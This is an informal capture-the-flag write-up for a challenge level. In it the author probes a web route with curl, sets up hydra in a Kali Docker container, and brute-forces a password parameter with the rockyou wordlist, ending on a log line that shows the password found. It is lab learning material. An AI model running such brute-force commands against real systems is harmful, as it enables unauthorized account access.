# Level 6

## Hacking the cracker

the route http://34.69.146.51:5000/level6/
returns to us:

{"error":"Invalid password"}

which obiously means that we need to send a password to the server.

I tried to send a password with curl via the following command:


```bash
curl -X POST http://34.69.146.51:5000/level6/ -H "Content-Type: application/json" -d '{"password": "testpassword"}'
```

and the response was:

$ curl -X POST http://34.69.146.51:5000/level6/ -H "Content-Type: application/json" -d '{"password": "testpassword"}'
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

which means it isnt a post request, so lets try a basic get request, with a password variable in the url:

```bash
http://34.69.146.51:5000/level6/?password=3
```
this does return invalid password

so we will start with a python script and bruteforce the password.


using hydra kali linux

basic flow for the kali linux docker

docker pull kalilinux/kali-rolling

docker run --network host -it kalilinux/kali-rolling /bin/bash

apt update

apt install hydra

hydra -h



 docker cp C:\Users\yaniv\ctf_challenge\excellenteam-ctf-yaniv242\level_6\rockyou.txt 4e749fdea52228eb9a206c6eaf230c1180614d4643f5663387032d3468c90155:/root/rockyou.txt

finaly the perfect command:
```bash
hydra -vV -l dummy -P rockyou.txt 34.69.146.51 http-get "/level6/?password=^PASS^:F=Invalid password" -s 5000
```

so in the end, the point of the drill was to catch the body erturned from the server, and not the header, which i was trying to catch.
so there was no point in using hydra, or checking for different types of status codes, as the server always returns 200 or 401 status codes.
and the body is the only thing that changes.

```bash

2024-09-10 13:19:05,289 - logger - CRITICAL - Password successful: dog, Response: {"error":"Request processing took too long and timed out... , try to fetch part of the data by specifying start and end of a batch"}